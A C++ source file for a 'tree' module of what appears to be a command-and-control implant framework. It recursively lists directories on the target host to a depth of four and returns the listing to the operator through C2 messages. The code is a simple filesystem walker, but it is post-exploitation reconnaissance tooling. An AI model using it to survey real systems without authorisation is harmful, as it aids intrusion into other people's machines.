#include "Tree.hpp"

#include <cstring>
#include <array>
#include <filesystem>
#include <sstream>

using namespace std;


const std::string moduleName = "tree";


#ifdef _WIN32

__declspec(dllexport) Tree* TreeConstructor() 
{
    return new Tree();
}

#endif

Tree::Tree()
	: ModuleCmd(moduleName)
{
}

Tree::~Tree()
{
}

std::string Tree::getInfo()
{
	std::string info;
	info += "tree:\n";
	info += "Tree\n";
	info += "exemple:\n";
	info += "- tree /tmp\n";

	return info;
}

int Tree::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    string path;
    for (int idx = 1; idx < splitedCmd.size(); idx++) 
    {
        if(!path.empty())
            path+=" ";
        path+=splitedCmd[idx];
    }

	c2Message.set_instruction(splitedCmd[0]);
	c2Message.set_cmd(path);

	return 0;
}

int Tree::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	string path = c2Message.cmd();
	std::string outCmd = iterProcess(path, 0);

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd(path);
	c2RetMessage.set_returnvalue(outCmd);

	return 0;
}


std::string Tree::iterProcess(const std::string& path, int depth)
{
    std::string result;

    if(depth>=4)
        return result;

    try
    {
        std::string actualPath=path;
        if(actualPath.empty())
            actualPath=std::filesystem::current_path().string();

        std::error_code e;
        for (const filesystem::directory_entry& file : filesystem::directory_iterator(actualPath, e))
        {
            try
            {
                filesystem::file_status status = filesystem::status(file.path().string(), e);

                for(int i=0; i<depth; i++)
                    result += "    ";

                if(status.type()==filesystem::file_type::directory)
                {
                    result += file.path().string();
                    result += "\\";
                    result += "\n";

                    std::string outCmd = iterProcess(file.path().string(), depth+1);
                    result += outCmd;
                }
                else
                {
                    result += file.path().string();
                    result += "\n";
                }

                }
                catch (...)
                {
                    // result += file.path().string();
                    // result += "\n";
                }
        }
    }
    catch (const std::exception &exc)
	{
	    result += "Error: ";
        result += exc.what();
        result += "\n";
    }

	return result;
}